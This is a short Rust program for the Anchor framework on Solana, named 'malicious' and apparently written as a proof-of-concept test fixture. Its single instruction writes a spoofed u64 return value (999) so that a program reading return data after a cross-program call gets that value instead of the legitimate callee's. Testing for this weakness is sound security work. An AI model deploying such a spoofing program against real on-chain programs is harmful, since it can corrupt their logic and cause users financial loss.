use anchor_lang::prelude::*;

declare_id!("6nWiFMhouBBrXir1h6BoZHoUzYJQTHwjUPPTGuKY9gXB");

#[program]
pub mod malicious {
    use super::*;

    /// This instruction manually calls set_return_data with a spoofed u64 value.
    /// When a caller reads return data via Return<T>::get() after this CPI,
    /// it will receive this spoofed value instead of the legitimate callee's value.
    pub fn spoof_return_data(_ctx: Context<SpoofReturn>) -> Result<()> {
        // Spoof a u64 value of 999 (0x03E7 in little-endian)
        let spoofed_value: u64 = 999;
        let data = spoofed_value.to_le_bytes();
        anchor_lang::solana_program::program::set_return_data(&data);
        Ok(())
    }
}

#[derive(Accounts)]
pub struct SpoofReturn<'info> {
    /// Dummy signer to satisfy CPI account requirements.
    /// CHECK: No constraints needed for the PoC.
    pub authority: Signer<'info>,
}
